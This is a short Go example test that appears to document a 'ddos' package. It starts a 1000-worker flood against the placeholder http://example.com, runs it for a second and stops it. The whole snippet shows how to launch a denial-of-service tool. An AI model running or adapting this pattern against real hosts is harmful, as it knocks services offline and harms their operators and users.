func ExampleNew() {
	workers := 1000
	d, err := ddos.New("http://example.com", workers)
	if err != nil {
		panic(err)
	}
	d.Run()
	time.Sleep(time.Second)
	d.Stop()
	fmt.Fprintf(os.Stdout, "DDoS attack server: http://example.com\n")
	// Output:
	// DDoS attack server: http://example.com
}

